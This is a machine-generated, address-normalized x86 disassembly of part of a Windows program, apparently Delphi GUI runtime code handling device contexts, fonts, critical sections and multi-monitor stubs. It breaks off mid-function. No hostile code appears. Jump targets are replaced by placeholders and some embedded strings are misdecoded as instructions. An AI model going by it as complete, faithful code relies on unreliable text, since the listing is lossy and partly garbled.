mov eax [ ebx + 0x28 ]
call sub_42143c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423c3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_423a10
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415f54
pop esi
pop ebx
retn
sub_423c8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_423ccd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call sub_41fd54
mov ecx esi
mov edx ebx
call sub_41f9f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423cd4
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_423cdc
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41e698
mov [ rw-data ] eax
pop ebx
retn
sub_423d14
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_423d58
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_423d14
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_423e24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_423e5c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_424054
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_423ea0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423e88
xor eax eax
push ebp
push sub_423f41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f48
mov eax [ ebp - 0x4 ]
call sub_423e94
retn
mov eax 0x10
call sub_4026dc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423f54
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_423f54
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_424033
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4224a8
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41d734
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41d618
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412be0
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d9bc
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41dd18
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_422164
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424054
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_423e88
xor eax eax
push ebp
push sub_42409f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240a6
mov eax [ ebp - 0x4 ]
call sub_423e94
retn
mov esp ebp
pop ebp
retn
sub_4240a6
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403198
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_423e88
xor eax eax
push ebp
push sub_42409f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240a6
mov eax [ ebp - 0x4 ]
call sub_423e94
retn
mov esp ebp
pop ebp
retn
sub_4240cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41c964
push eax
mov eax ebx
call sub_41c964
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_423ea0
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_424104
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4241cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241d4
retn
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
call sub_403198
call sub_42111c
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
call sub_403198
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404970
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404970
sub_4241d8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423cdc
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_423d58
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c11c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c11c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c11c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e24
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4142ac
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4142ac
mov [ rw-data ] eax
mov ecx sub_41c974
mov edx sub_41c984
mov eax [ sub_41b0b4 ]
call sub_413a10
mov ecx r-xdata
mov edx sub_41cb8c
mov eax [ r-xdata ]
call sub_413a10
sub_4242e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424309
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424310
retn
sub_42444c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4244a4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_4142a8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403198
sub_4244e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42452c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_424570
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413f38
mov eax esi
pop esi
pop ebx
retn
sub_42459c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4245c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245c8
retn
sub_424698
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4246bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246c4
retn
sub_4246d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404398
xor eax eax
push ebp
push sub_42478f
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424796
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4246d0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403ee8
sub_4247b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4246d0
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_424840
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4246d0
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_4248d0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4246d0
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_424840
sub_424966
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4246d0
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4249e7
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4246d0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424ad4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4246d0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424ba8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4246d0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_424c7c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4246d0
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_424e17
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_424e3d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e44
retn
sub_424e58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424e7d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e84
retn
sub_425254
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4252ca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4253e0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40564c
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4252d1
lea eax [ ebp - 0x8 ]
call sub_405634
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42536c
mov [ rw-data ] eax
sub_4252d8
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42536c
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405678
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_425330
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40564c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42536c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov dl 0x1
mov eax [ r-xdata ]
call sub_42444c
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42444c
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42444c
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403ee8
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4253e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4254e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_425330
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42449c
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405634
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d3bc
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405634
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d3bc
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425330
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42449c
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_425330
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42449c
mov ecx r-xdata
call sub_405678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254e8
lea eax [ ebp - 0xc ]
call sub_405634
lea eax [ ebp - 0x8 ]
call sub_405634
retn
sub edx 0xfffffff8
sub_425500
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_424488
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_425540
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_424488
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_425570
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_425702
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_424488
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42569d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425709
